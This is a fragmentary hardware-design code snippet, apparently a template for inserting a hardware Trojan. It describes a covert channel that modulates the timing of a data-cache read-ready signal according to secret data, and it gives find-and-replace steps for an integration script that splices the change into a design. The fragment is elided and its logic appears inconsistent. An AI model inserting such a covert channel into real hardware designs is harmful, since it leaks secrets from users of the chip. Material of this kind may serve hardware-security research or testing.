 ...
 * Payload: Modulate timing of dcache_mem_req_read_ready_i based on secret data
 * 
...
assign secret_bit = dcache_mem_req_read_ready_i[0];
...
// ============================================================
// Covert Channel: Modulate timing of dcache_mem_req_read_ready_i
//
// Integration Script Must Modify:
//
// IF dcache_mem_req_read_ready_i is timing-sensitive:
//   Find: assign dcache_mem_req_read_ready_i = ready_signal;
//   Replace: assign dcache_mem_req_read_ready_i = (timing_delay == 0) ? ready_signal : 1'b0;
//
